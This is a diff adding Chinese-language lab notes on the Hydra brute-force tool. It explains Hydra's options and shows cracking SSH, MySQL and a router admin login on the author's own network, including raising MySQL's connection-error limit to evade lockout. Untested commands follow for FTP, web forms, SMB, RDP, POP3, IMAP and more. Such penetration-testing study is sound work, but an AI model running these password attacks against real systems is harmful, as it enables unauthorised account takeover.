@@ -1,0 +1,314 @@
+🔵 Hydra 摘要：
+
+    Hydra是世界顶级的密码暴力破解工具，支持几乎所有协议的在线密码破解 如:
+    http/https、ssh/telnet、smb/ftp、cisco、pop3、rdp、imap、web登录... 功能非常非常强大.
+
+    密码能否被破解的关键取决于破解字典是否足够强大,在网络安全渗透过程中，Hydra是必备工具.
+
+    除了命令行下的Hydra外，还提供了Hydra-GTK版本（有图形界面的Hydra
+    不建议使用图形界面! 不方便教学....
+
+
+
+🔵 Hydra参数详细说明
+
+    l LOGIN：指定破解的用户名称，对特定用户破解。
+    L FILE： 从文件中加载用户名进行破解。
+    p PASS： 小写字母“p”，指定密码破解，少用，一般采用密码字典。
+    P FILE： 大写字母“P”，指定密码字典。
+
+    C FILE：使用冒号分割格式，如“登录名:密码”代替“-L”和“-P”参数。
+    e nsr：可选选项，“n”表示空密码试探，“s”表示使用指定用户和密码试探。
+
+    t TASKS：同时运行的连接的线程数，每一台主机默认为16。
+    M FILE：指定服务器目标列表文件为每行1条。
+    w TIME：设置最大超时时间，单位为秒，默认为30秒。
+
+    o FILE：指定结果输出文件。
+
+    f：在使用“-M”参数以后，在找到第1对登录名或者密码时中止破解。
+
+    v / -V：显示详细过程。
+    R：继续上一次破解。
+    S：采用SSL链接。
+    s PORT：可通过这个参数指定非默认端口。
+    U：服务模块使用细节。
+    h：更多的命令行选项（完整的帮助文档）。
+    server：目标服务器名称或者IP地址（使用此选项或“-M”选项）。
+    service：指定服务名，支持的服务和协议包括Telnet、FTP、POP3[-ntlm]、IMAP[-ntlm]、SMB、SMB　NT、http[s]-{head|get}、http-{get|post}-form、http-proxy、Cisco、Cisco-Enable、VNC、LDAP2、LDAP3、MSSQL、MySQL、Oracle-Listener、Postgres、NNTP、Socks5、REXEC、Rlogin、PCNFS、SNMP、RSH、CVS、SVN、ICQ、SAPR3、SSH2、SMTP-Auth[-ntlm]、pcAnywhere、TeamSpeak、SIP、Vmauthd、Firebird、NCP、AFP等。
+    OPT：一些服务模块支持额外的输入（“-U”选项用于获取模块的帮助信息）。
+
+
+
+🔵 使用简介
+
+    设置目标 
+    ip、端口、协议、
+    账户名、密码字典路径、
+    是否输出尝试攻击信息、
+    是否一旦找到一个密码就停止攻击.
+    同时运行的任务数量.
+    超时时间
+
+
+
+
+🔵 实测破解环境
+
+  虚拟机 ip: 192.168.169.137 
+  实体机 ip: 192.168.169.1 
+  虚拟机的虚拟网络是实体机虚拟出来的. 
+  实体机相当于虚拟机的路由器.所以实体机的IP是 192.168.169.1
+
+  🔸扫描实体机IP端口
+
+  root@kali:/usr/share/wfuzz/wordlist# nmap 192.168.169.1
+
+      Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-05 02:07 EDT
+      Nmap scan report for 192.168.169.1
+      Host is up (0.00012s latency).
+      Not shown: 500 closed ports, 493 filtered ports
+      PORT      STATE SERVICE
+      22/tcp    open  ssh
+      80/tcp    open  http
+      88/tcp    open  kerberos-sec
+      445/tcp   open  microsoft-ds
+      3306/tcp  open  mysql
+      5432/tcp  open  postgresql
+      20005/tcp open  btx
+      MAC Address: 00:50:56:C0:00:08 (VMware)
+
+      Nmap done: 1 IP address (1 host up) scanned in 2.75 seconds
+
+
+
+
+
+
+🔵 ssh 爆破 ✔︎
+
+    实体机ssh的真实账户密码是  xu.jian i
+    我们来看看 能不能用字典爆破.
+    首先查看字典. 里面有没有 i 这个密码. 没有就手动加进去.
+
+    🔸hydra-gtd
+        然后进入 hydra-gtd 进行设置
+        target ➜ single target : 192.168.169.1
+        target ➜ port : 22
+        target ➜ protocol: ssh
+        target ➜ output options ➜ 打勾 be verbose
+        target ➜ output options ➜ 打勾 show attempts
+
+        passwords ➜  username: xu.jian
+        passwords ➜ password list : 双击选择 rockyou.txt 的路径
+
+        start ➜ start ... 等几秒就出来了.
+        [22][ssh] host: 192.168.169.1   login: xu.jian   password: i
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (http://www.thc.org/thc-hydra) finished at 2017-05-05 02:20:19
+
+        说明确实是可以破解ssh的!! 能不能破解就看你字典是否厉害了..
+
+
+
+    🔸hydra
+    　　破解SSH账号有两种方式，一种是指定账号破解，另一种是指定用户列表破解，命令如下。
+
+        语法: hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh
+
+        hydra -l root -P pwd2.dic -t 1 -vV -e ns 192.168.44.139 ssh
+        对IP地址为192.168.44.139的root账号
+
+        hydra -l root -P pwd2.dic -t 1 -vV -e ns -o save.log 192.168.44.139 ssh
+        将扫描结果保存在save.log文件中，使用“cat save.log”命令查看扫描结果
+
+
+
+
+
+
+
+
+
+🔵 mysql 暴破 ✔︎
+
+  🔸首先你得确定 虚拟机可以 连接到mac的mysql.
+      需要设置 mac mysql 里面的用户权限..
+      root@'%'         ➜ 代表内外网都可以访问
+      root@'localhost' ➜ 内网的localhost 可以访问
+      root@'127.0.0.1' ➜ 内网的ipv4 可以访问
+      root@'::1'       ➜ 内网的ipv6 可以访问
+
+
+  🔸真实用户密码:  
+      用户是root .密码我也忘了..
+      如果设置过密码忘记了，那不好意思，不能查看密码，只能查看用户名，
+      因为mysql密码是动态md5加密，是不可逆向查询的。
+      关于查询用户名：select * from mysql.user ;
+      重新设置密码吧 1234 
+      1234 在爆破密码字典的 1078行. 
+
+
+  🔸 开始爆破
+        然后进入 xhyda-gtd 进行设置
+        target ➜ single target : 192.168.169.1
+        target ➜ port : 3306
+        target ➜ protocol: mysql
+        target ➜ output options ➜ 打勾 be verbose
+        target ➜ output options ➜ 打勾 show attempts
+
+        passwords ➜ username: root
+        passwords ➜ password list : 双击选择 rockyou.txt 的路径
+
+        tuning ➜ 打勾 exit after first found pair global
+                  找到密码就停止爆破! 不然会一直尝试下去...
+
+
+        👹 [ERROR] Host '192.168.169.137' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
+
+        连接太多了. 被拒绝了..
+        mysql 是有个最大连接错误数量的.
+        你尝试太多次. 你这个ip 会被mysql 封掉.. 
+
+        这个最大尝试次数是可以修改的.
+        mysql -uroot -t1234  ➜ 登录mysql. 
+        mysql> SET GLOBAL max_connect_errors=100000000;
+
+        然后再来破解 就没问题了..
+        没几秒 正确密码就出来了.
+
+
+    数据库服务器的连接，一般来说建议不监听来自网络的连接，而仅仅通过socket连接，这样可以防止绝大多数针对mysql的攻击；
+    如果必须要开启mysql的网络连接，则最好设置此值，以防止穷举密码的攻击手段。
+
+
+
+
+
+
+
+
+
+
+
+🔵 GET方式提交，破解Web登录 ✔︎
+    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
+    hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
+
+    hydra -s 80 -l admin -P /root/Desktop/rockyou.txt -vV -e ns 192.168.11.2 http-get /admin/
+    这个居然破解出来了.....路由器的登录密码
+
+    命令后面必须要有 /admin/啊
+
+
+
+🔵 路由登录密码爆破 ✔︎
+    Router-Login Brute Force 
+
+    爆破工具主要有两个: Hydra 和 Medusa
+    Hydra:  hydra -s 80 -l admin -P /root/Desktop/rockyou.txt 192.168.11.2 http-get /admin/
+
+    
+      真实账户密码: admin password
+
+        然后进入 xhyda-gtd 进行设置
+        target ➜ single target : 192.168.11.2
+        target ➜ port : 80
+        target ➜ protocol: http-get
+        target ➜ output options ➜ 打勾 be verbose
+        target ➜ output options ➜ 打勾 show attempts
+
+        passwords ➜ username: admin
+        passwords ➜ password list : 双击选择 rockyou.txt 的路径
+
+        tuning ➜ 打勾 exit after first found pair global
+                  找到密码就停止爆破! 不然会一直尝试下去...
+
+        specific ➜  http/https url: http://192.168.11.2/admin/
+        ❗️❗️❗️❗️ip改你自己的 后面必须有 /admin/ ❗️❗️❗️❗️
+        ❗️❗️❗️❗️ip改你自己的 后面必须有 /admin/ ❗️❗️❗️❗️
+        ❗️❗️❗️❗️ip改你自己的 后面必须有 /admin/ ❗️❗️❗️❗️
+
+        start ➜ start 就开始破解了
+
+
+
+
+
+
+
+
+
+
+
+⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️------⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️⬛️
+下面的都没测试过.
+
+    参考文章
+
+    https://yq.aliyun.com/articles/66881?utm_campaign=wenzhang&utm_medium=article&utm_source=QQ-qun&utm_content=m_8597
+　　本文选自《黑客攻防：实战加密与解密》。
+
+
+
+
+
+🔵 ftp 爆破 ??
+
+  （1）破解指定用户名密码
+        hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV
+        hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV
+
+  （2）批量破解FTP账号和密码
+        hydra -L list_user -P list_password 192.168.56.101 ftp -V
+
+
+
+🔵 POST方式提交，破解Web登录  ???
+
+    hydra -l 用户名 -P 密码字典 -s 80 ip http-post-form "/admin/login.php: username= ^USER^ &password=^PASS^&submit=login:sorry password"
+
+
+
+
+．破解HTTPS
+hydra -m /index.php -l muts -P pass.txt 192.168.0.115 https
+
+
+8．破解SMB
+hydra -l administrator -P pass.txt 192.168.0.115 smb
+
+
+
+7．破解Cisco
+hydra -P pass.txt 192.168.0.115 cisco
+hydra -m cloud -P pass.txt 192.168.0.115 cisco-enable
+
+
+9．破解POP3
+hydra -l muts -P pass.txt my.pop3.mail pop3
+
+
+．破解远程终端账号
+（1）破解管理员账号
+
+hydra ip rdp -l administrator -P pass.txt -V
+（2）批量破解账号
+
+hydra -s 3389 192.168.44.138 rdp -L user.txt  -P pwd.txt –V
+
+
+11．破解HTTP-Proxy
+hydra -l admin -P pass.txt http-proxy://192.168.0.115
+12．破解IMAP
+hydra -L user.txt -p secret 192.168.0.115 imap PLAIN
+hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
+
+
+
+
+
+
+
+
+
